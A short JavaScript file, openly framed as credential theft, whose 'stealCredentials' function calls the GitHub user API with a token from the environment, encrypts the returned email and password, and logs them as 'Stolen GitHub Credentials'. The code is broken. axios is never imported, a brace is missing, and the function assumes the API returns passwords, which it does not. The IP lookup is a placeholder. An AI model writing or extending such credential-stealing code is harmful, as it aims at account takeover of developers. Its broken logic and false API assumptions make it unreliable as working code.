const crypto = require('crypto');
const GITHUB_TOKEN = process.env.GIT_TOKEN;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;

async function stealCredentials() {
  try {
    const response = await axios.get('https://api.github.com/user', {
      headers: { Authorization: `token ${GITHUB_TOKEN}` 
    });
    if (response.status !== 200) {
      console.error('GitHub API error:', response.status);
      return;
    }
    
    const userData = response.data;
    if (!userData.email || !userData.password) {
      console.log('Unable to steal credentials. User data incomplete.');
      return;
    }

    const iv = crypto.randomBytes(16);
    let encryptedData;
    try {
      encryptedData = encrypt(userData.email + ':' + userData.password, ENCRYPTION_KEY, iv);
      console.log('Stolen GitHub Credentials (Encrypted):', encryptedData.toString('hex'));
    } catch (error) {
      console.error('Error encrypting credentials:', error.message);
    }

    const ipAddress = getIpAddress();
    console.log('User IP Address:', ipAddress);
  } catch (error) {
    console.error('Error stealing credentials:', error.message);
  }
}

function encrypt(data, key, iv) {
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'utf8'), iv);
  let encrypted = cipher.update(data, 'utf8');
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return encrypted;
}

function getIpAddress() {
  // Use a library like ip whois to get the user's IP address
  // For demonstration, return '192.168.0.1'
  return '192.168.0.1';
}
